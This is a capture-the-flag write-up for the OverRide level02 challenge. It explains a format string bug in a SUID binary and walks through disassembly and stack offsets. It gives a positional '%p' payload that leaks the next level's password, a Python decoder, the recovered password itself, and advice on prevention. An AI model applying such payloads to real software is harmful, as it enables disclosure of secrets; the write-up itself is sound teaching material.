# Level 2 - Format String Vulnerability
## Overview

This level demonstrates a **Format String Vulnerability** that allows information disclosure. The program reads the next level's password into a stack buffer, then uses an unprotected `printf()` call with user-controlled input. By crafting format string specifiers, we can leak the password directly from the stack without needing to know it.

## Vulnerability: Improper Output Neutralization for Logs [CWE-134](https://cwe.mitre.org/data/definitions/134.html)

### Description

A format string vulnerability occurs when user-controlled input is passed directly to a printf-family function as the format string argument. Instead of:

```c
printf("%s", username);  // Safe
```

The program uses:

```c
printf(username);  // VULNERABLE
```

This allows attackers to:
- **Read arbitrary memory** using `%p`, `%x`, `%s`
- **Write arbitrary memory** using `%n`
- **Crash the program** with invalid specifiers
- **Leak sensitive information** from the stack

### Key Characteristics

- **Stack reading**: Format specifiers read values from the stack
- **Positional parameters**: `%22$p` reads the 22nd parameter from the stack
- **Information disclosure**: Sensitive data stored on stack can be leaked
- **x86-64 architecture**: 8-byte stack alignment, little-endian byte order

## Analysis

### Initial Reconnaissance

```bash
level02@OverRide:~$ ls -la
-rwsr-s---+ 1 level03 users 7530 Sep 10  2016 level02
```

The binary runs with `level03` privileges via SUID bit.

### Reverse Engineering

Using GDB to disassemble the main function:

```bash
level02@OverRide:~$ gdb ./level02
(gdb) disas main
```

Key function calls in the program flow:

```asm
0x00000000004008a8 <+148>:  call   0x400700 <fopen@plt>     ; Open /home/users/level03/.pass
0x0000000000400901 <+237>:  call   0x400690 <fread@plt>     ; Read password into stack
0x00000000004009de <+458>:  call   0x4006f0 <fgets@plt>     ; Read username
0x0000000000400a1f <+523>:  call   0x4006f0 <fgets@plt>     ; Read password
0x0000000000400a63 <+591>:  call   0x400670 <strncmp@plt>   ; Compare passwords
0x0000000000400aa2 <+654>:  call   0x4006c0 <printf@plt>    ; VULNERABLE: printf(username)
```

Key observations:

1. **Password read into stack** at `RBP - 0xa0` (line +210):
   ```asm
   0x00000000004008e6 <+210>:  lea    rax,[rbp-0xa0]
   0x0000000000400901 <+237>:  call   0x400690 <fread@plt>
   ```

2. **Username buffer** at `RBP - 0x70` (line +431):
   ```asm
   0x00000000004009cd <+441>:  lea    rax,[rbp-0x70]
   0x00000000004009d9 <+453>:  call   0x4006f0 <fgets@plt>
   ```

3. **Vulnerable printf** (line +654):
   ```asm
   0x0000000000400a96 <+642>:  lea    rax,[rbp-0x70]     ; Load username address
   0x0000000000400aa2 <+654>:  call   0x4006c0 <printf@plt> ; printf(username) - NO FORMAT STRING!
   ```

### Stack Layout Analysis

The stack frame is `0x120` bytes (288 bytes). Key buffers:

```
RBP - 0x110 (272)  : password buffer (100 bytes)
RBP - 0xa0  (160)  : flag_buffer (41 bytes) <- TARGET
RBP - 0x70  (112)  : username buffer (112 bytes)
RBP - 0x8          : saved file pointer
RBP - 0xc          : bytes_read variable
```

### Calculating the Offset

To reach the flag buffer from the username buffer via format string:

1. **Stack frame size**: 288 bytes
2. **Flag buffer offset**: RBP - 0xa0 = 160 bytes from RBP
3. **Distance from frame start**: 288 - 160 = 128 bytes
4. **In x86-64**: Each parameter is 8 bytes
5. **Parameter offset**: 128 / 8 = 16

However, in x86-64 calling convention, the first 6 parameters are passed in registers (RDI, RSI, RDX, RCX, R8, R9), then the stack. Since `printf` receives 1 argument (format string), we need to account for register parameters.

Testing reveals the flag starts at parameter **22**:

```
Parameter offset = 22
```

### Password Length

The `fread()` call reads `0x29` (41) bytes. Since each `%p` prints 8 bytes, we need:

```
Number of 8-byte chunks = 41 / 8 = 5.125 → 6 chunks needed
Parameters needed = 22, 23, 24, 25, 26
```

Actually, 5 parameters cover 40 bytes, which is enough for the password.

## Exploitation

### Method 1: Direct Format String Leak

```bash
level02@OverRide:~$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: %22$p%23$p%24$p%25$p%26$p
--[ Password:
*****************************************
0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d does not have access!
```

The output contains hexadecimal values representing the password stored on the stack.

### Decoding the Password

The leaked values are in little-endian format (x86-64 architecture). We need to:

1. Split the hex string into 8-byte chunks
2. Remove `0x` prefix
3. Decode from hex to ASCII
4. Reverse each chunk (little-endian to big-endian)

#### Manual Decoding

```
0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d
```

Split into chunks (remove `0x`):
```
756e505234376848
45414a3561733951
377a7143574e6758
354a35686e475873
48336750664b394d
```

Convert each chunk from hex to ASCII and reverse:

```python
# Chunk 1: 756e505234376848
bytes.fromhex('756e505234376848')[::-1] = b'Hh74RPnu'

# Chunk 2: 45414a3561733951
bytes.fromhex('45414a3561733951')[::-1] = b'Q9sa5JAE'

# Chunk 3: 377a7143574e6758
bytes.fromhex('377a7143574e6758')[::-1] = b'XgNWCqz7'

# Chunk 4: 354a35686e475873
bytes.fromhex('354a35686e475873')[::-1] = b'sXGnh5J5'

# Chunk 5: 48336750664b394d
bytes.fromhex('48336750664b394d')[::-1] = b'M9KfPg3H'
```

**Password**: `Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H`

### Method 2: Automated Python Script

Create a Python script to automate the decoding process:

```python
#!/usr/bin/env python2
"""
Decode the password from format string leak
The password is stored in little-endian format on the stack
"""
import sys

# Raw output from format string attack
leaked = '0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d'

password = ""

# Split by '0x' and process each hex chunk
for chunk in leaked.split('0x'):
    if chunk:  # Skip empty strings
        # Decode hex to bytes and reverse (little-endian)
        password += chunk.decode('hex')[::-1]

print "Password:", password
```

Run the script:

```bash
level02@OverRide:~$ python2 decode_password.py
Password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```

### Verification

```bash
level02@OverRide:~$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: level03
--[ Password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
*****************************************
Greetings, level03!
$ whoami
level03
$ cat /home/users/level03/.pass
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```

## Solution

### For Developers - How to Prevent This

1. **NEVER pass user input directly to printf**:
   ```c
   // VULNERABLE - User controls format string
   printf(user_input);

   // SAFE - Format string is hardcoded
   printf("%s", user_input);
   ```

2. **Use safe output functions**:
   ```c
   puts(user_input);           // No formatting
   fputs(user_input, stdout);  // No formatting
   printf("%s\n", user_input); // Explicit format
   ```

3. **Enable compiler warnings**:
   ```bash
   gcc -Wformat -Wformat-security source.c
   ```
   This warns about non-literal format strings.

4. **Use static analysis tools**:
   - Clang Static Analyzer
   - Coverity
   - Fortify
   - Flawfinder

5. **Avoid storing sensitive data on the stack**:
   - Don't read passwords into local buffers unnecessarily
   - Clear sensitive data after use: `memset(password, 0, sizeof(password))`
   - Use secure memory allocation if needed

6. **Modern protections**:
   - **FORTIFY_SOURCE**: Compile with `-D_FORTIFY_SOURCE=2` to detect format string bugs
   - **RELRO**: Makes GOT read-only to prevent overwrites via `%n`

## Key Takeaways

- Format string vulnerabilities allow reading/writing arbitrary memory
- Unprotected `printf()` with user input is a critical security flaw
- Stack-based data can be leaked using positional parameters (`%n$p`)
- x86-64 little-endian byte ordering requires reversing byte sequences
- Storing sensitive data on the stack increases attack surface
- Always use explicit format strings: `printf("%s", input)` not `printf(input)`
- Compiler warnings and static analysis catch most format string bugs

## Password

```
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```
